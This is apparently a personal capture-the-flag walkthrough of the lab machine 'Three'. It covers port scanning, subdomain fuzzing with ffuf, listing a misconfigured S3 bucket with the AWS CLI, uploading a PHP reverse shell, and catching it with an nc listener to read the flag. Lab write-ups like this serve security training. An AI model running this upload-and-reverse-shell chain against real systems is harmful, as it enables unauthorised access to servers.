
#### About

Three is a very easy Linux machine featuring a website using a misconfigured AWS S3 bucket as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.

Date : April 5 2026

- - -

# What I did

```bash
> nmap 10.129.61.158
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-05 11:31 -04
Nmap scan report for 10.129.61.158
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 61.42 seconds
```

2 TCP ports are opened

>In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

`/etc/hosts`

Add the custom hostname thetoppers.htb into our /etc/hosts file because it can't be resolved :

`10.129.61.158    thetoppers.htb`

```bash

> ffuf -u http://thetoppers.htb -w Documents/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.thetoppers.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://thetoppers.htb
 :: Wordlist         : FUZZ: /home/guillaume/Documents/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.thetoppers.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [40/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erns2                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 204ms]
:: Progress: [40/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ermail                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [41/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erwiki                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [42/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ersip                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [43/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Eradmin                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 206ms]
:: Progress: [44/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erlocalhost               [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 220ms]
:: Progress: [45/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erenterpriseenrollment    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 204ms]
:: Progress: [46/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erportal                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [47/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erftp                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [48/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ersupport                 [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 206ms]
:: Progress: [49/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [50/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erdns                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 204ms]
:: Progress: [50/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erapi                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [51/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [52/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erweb                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 218ms]
:: Progress: [52/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ernew                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [53/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erimages                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 205ms]
:: Progress: [54/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Eremail                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 227ms]
:: Progress: [55/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erzabbix                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 227ms]
:: Progress: [56/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erdocs                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 219ms]
:: Progress: [57/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erold                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 226ms]
:: Progress: [58/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erapp                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 226ms]
:: Progress: [59/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [60/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erdemo                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 206ms]
:: Progress: [60/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ermsoid                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 219ms]
:: Progress: [61/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ernews                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 224ms]
:: Progress: [62/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erchat                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 218ms]
:: Progress: [63/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Ermx                      [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 224ms]
:: Progress: [64/20000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erwhm                     [Status: 200, Size: 11952, W

```

Every subdomain with size 11952 is returned with a status code 200. That is because the web server has a default virtual host. When the server recieves a request for a subdomain that he doesn't know, `xyz.thetoppers.htb`, instead of returning 404, it responds with the principal page, always. So thats why its always the same page that its returned with 11952 bytes. So first. We have to filter the size of the returned subdomains, so basically ignore everything which matches the default website.

We can do that using the `-fs`switch

`> ffuf -u http://thetoppers.htb -w Documents/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.thetoppers.htb" -fs 11952`

After using the -fs filter, nothing is returned.

```
 :: Method           : GET
 :: URL              : http://thetoppers.htb
 :: Wordlist         : FUZZ: /home/guillaume/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.thetoppers.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 11952
```

The matcher for responses statuses does not include 404. Maybe the subdomain we want falls into this category.

```bash
MATCHER OPTIONS:
  -mc                 Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
```

`> ffuf -u http://thetoppers.htb -w Documents/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.thetoppers.htb" -fs 11952 -mc all`


```bash
s3 [Status: 404, Size: 21, Words: 2, Lines: 1, Duration: 219ms]
```

found subdomain : `s3.thetoppers.htb`

Why is it 404 ? Because s3.thetoppers.htb is a true v host configured on the server, but it contains an empty s3 bucket or a resource that doesn't exist. but the server recognizes it as a true subdomain. 

The server is running the amazon s3 service.

>Which command line utility can be used to interact with the service running on the discovered sub-domain?
`awscli`

```bash
> aws configure

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: us-east-1
Default output format [None]: json
```

```bash
> aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
                           PRE images/
2026-04-06 10:06:37          0 .htaccess
2026-04-06 10:06:37      11952 index.php

```

The goal is to get the flag. with amazon s3, we can upload a file to the server.
Since it's not secured, I think we can upload something like a php reverse shell to get an access to the machine.

```bash

> aws s3 cp ~/Downloads/php-reverse-shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

upload: ../Downloads/php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php
> aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb
                           PRE images/
2026-04-06 10:06:37          0 .htaccess
2026-04-06 10:06:37      11952 index.php
2026-04-06 12:00:15       5493 php-reverse-shell.php

```


``` bash

> nc -lvnp  8888
Listening on 0.0.0.0 8888
Connection received on 10.129.62.252 43610
Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 15:22:45 up  2:16,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls

$ cat /var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b

```

